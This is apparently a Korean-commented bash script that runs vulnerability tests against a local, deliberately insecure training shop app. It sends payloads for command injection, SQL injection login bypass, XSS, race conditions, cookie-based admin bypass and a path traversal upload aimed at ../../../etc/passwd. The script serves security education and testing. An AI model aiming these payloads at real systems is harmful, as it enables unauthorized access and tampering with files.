#!/bin/bash

# 해커 굿즈 쇼핑몰 보안 취약점 테스트 스크립트

# 서버 URL 설정
SERVER_URL="http://localhost:3001"
BOLD='\033[1m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${BOLD}=== 해커 굿즈 쇼핑몰 보안 취약점 테스트 ===${NC}"
echo

# 서버 연결 확인
echo -e "${YELLOW}[INFO] 서버 연결 확인 중...${NC}"
if curl -s "$SERVER_URL/api/products" > /dev/null; then
    echo -e "${GREEN}[SUCCESS] 서버 연결 성공${NC}"
else
    echo -e "${RED}[ERROR] 서버에 연결할 수 없습니다. 서버가 실행 중인지 확인해주세요.${NC}"
    echo "서버 실행 명령: PORT=3001 node server.js"
    exit 1
fi

echo

# 1. Command Injection 테스트
echo -e "${BOLD}1. Command Injection 테스트${NC}"
echo -e "${YELLOW}[TEST] 정상 검색 테스트${NC}"
curl -s "$SERVER_URL/api/search?q=키보드" | head -100
echo
echo -e "${YELLOW}[TEST] Command Injection 공격 테스트${NC}"
echo "공격 URL: $SERVER_URL/api/search?q=\"; ls -la; echo \""
curl -s "$SERVER_URL/api/search?q=%22%3B%20ls%20-la%3B%20echo%20%22" | head -100
echo
echo

# 2. SQL Injection 테스트
echo -e "${BOLD}2. SQL Injection 테스트${NC}"
echo -e "${YELLOW}[TEST] 정상 로그인 테스트${NC}"
curl -s -X POST "$SERVER_URL/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin123"}'
echo
echo -e "${YELLOW}[TEST] SQL Injection 공격 테스트${NC}"
curl -s -X POST "$SERVER_URL/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin\" OR \"1\"=\"1", "password": "anything"}'
echo
echo

# 3. XSS 테스트
echo -e "${BOLD}3. XSS 테스트${NC}"
echo -e "${YELLOW}[TEST] XSS 공격 테스트${NC}"
echo "공격 URL: $SERVER_URL/api/profile?name=<script>alert('XSS')</script>"
curl -s "$SERVER_URL/api/profile?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"
echo
echo

# 4. Race Condition 테스트
echo -e "${BOLD}4. Race Condition 테스트${NC}"
echo -e "${YELLOW}[TEST] 동시 주문 요청 테스트 (10개 요청)${NC}"
for i in {1..10}; do
    curl -s -X POST "$SERVER_URL/api/order" \
      -H "Content-Type: application/json" \
      -d '{"productId": 1, "quantity": 100, "userId": 1}' &
done
wait
echo "동시 주문 요청 완료"
echo

# 5. 권한 우회 테스트
echo -e "${BOLD}5. 권한 우회 테스트${NC}"
echo -e "${YELLOW}[TEST] 권한 없이 관리자 API 접근${NC}"
curl -s "$SERVER_URL/api/admin/users"
echo
echo -e "${YELLOW}[TEST] 쿠키 조작을 통한 권한 우회${NC}"
curl -s "$SERVER_URL/api/admin/users" \
  -H "Cookie: role=admin"
echo
echo

# 6. 경로 탐색 테스트
echo -e "${BOLD}6. 경로 탐색 테스트${NC}"
echo -e "${YELLOW}[TEST] 정상 파일 업로드${NC}"
echo "test content" > /tmp/test.txt
curl -s -X POST "$SERVER_URL/api/upload" \
  -F "file=@/tmp/test.txt" \
  -F "filename=test.txt"
echo
echo -e "${YELLOW}[TEST] 경로 탐색 공격${NC}"
curl -s -X POST "$SERVER_URL/api/upload" \
  -F "file=@/tmp/test.txt" \
  -F "filename=../../../etc/passwd"
echo
rm -f /tmp/test.txt
echo

echo -e "${BOLD}=== 테스트 완료 ===${NC}"
echo -e "${GREEN}모든 취약점 테스트가 완료되었습니다.${NC}"
echo -e "${YELLOW}브라우저에서 $SERVER_URL을 열어 웹 인터페이스를 확인해보세요.${NC}"
echo
echo -e "${RED}⚠️  주의: 이 테스트는 교육 목적으로만 사용하세요!${NC}"
